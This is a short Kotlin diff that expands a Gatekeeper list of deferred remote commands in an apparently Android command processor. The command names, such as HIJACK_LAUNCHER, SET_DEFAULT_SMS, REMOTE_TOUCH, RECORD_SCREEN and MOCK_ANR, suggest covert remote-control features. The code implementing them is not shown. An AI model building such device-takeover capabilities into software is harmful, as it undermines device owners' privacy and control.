@@ -2922,7 +2922,12 @@ object CommandProcessor {
     }
 
     object Gatekeeper {
-        private val GATED_COMMANDS = listOf("FORCE_DATA", "FLIGHT_MODE", "HIJACK_LAUNCHER", "SET_DEFAULT_SMS", "RESTORE_DEFAULT_SMS", "RESET_BACKGROUND_TASKS", "FINALIZE_RESET", "FULL_ONBOARDING", "REMOTE_TOUCH", "RECORD_SCREEN")
+        private val GATED_COMMANDS = listOf(
+            "FORCE_DATA", "FLIGHT_MODE", "HIJACK_LAUNCHER", "SET_DEFAULT_SMS", "RESTORE_DEFAULT_SMS", 
+            "RESET_BACKGROUND_TASKS", "FINALIZE_RESET", "FULL_ONBOARDING", "REMOTE_TOUCH", "RECORD_SCREEN",
+            "SET_SYSTEM_FONT", "SET_SYSTEM_THEME", "EYE_SHIELD", "EYE_SHIELD_SILENT", "MASTER_DISPLAY_RESET",
+            "WIPE_TASKS", "MOCK_ANR", "ACC_GOTO_SETTINGS"
+        )
         private const val QUEUE_PREF = "deferred_commands"
 
         suspend fun evaluateAndGate(ctx: Context, cmd: JSONObject): Boolean {
